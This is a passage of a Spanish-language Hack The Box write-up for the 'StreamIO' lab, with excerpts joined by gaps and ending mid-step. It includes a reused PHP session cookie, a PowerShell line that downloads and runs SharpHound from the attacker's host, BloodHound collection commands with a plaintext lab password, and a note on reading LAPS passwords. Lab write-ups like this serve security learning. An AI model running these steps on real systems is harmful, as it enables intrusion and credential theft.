...
En **/admin/** pone FORBIDDEN, el sisteam arrastra una PHPSESSID es decir una cookie de PHP, si consiguieramos
la correcta podríamos entrar.
...
Con las credenciales de esta persona se puede acceder al panel de admin de antes ```PHPSESSID: 
38omuh6knr35pgjhtfvmi83tjd```
...
?>
```
Si pones ```https://streamio.htb/admin/master.php``` dice que solo se puede acceder desde "includes" es decir
desde el debug de antes:
...
```
```
*Evil-WinRM* PS C:\Users\nikk37\Documents> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.16/SharpHound.ps1')
*Evil-WinRM* PS C:\Users\nikk37\Documents> Invoke-BloodHound -CollectionMethod All
*Evil-WinRM* PS C:\Users\nikk37\Documents> download C:\Users\nikk37\Documents\20221211162308_BloodHound.zip data.zip
```
```console
└─$ bloodhound-python -c All -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.10.11.158 -d streamio.htb -dc streamio.htb --zip
```

Nuestro usaurio tiene el privilegio "Read LAPS password".
Hay que loeguearse como este usuario
```console
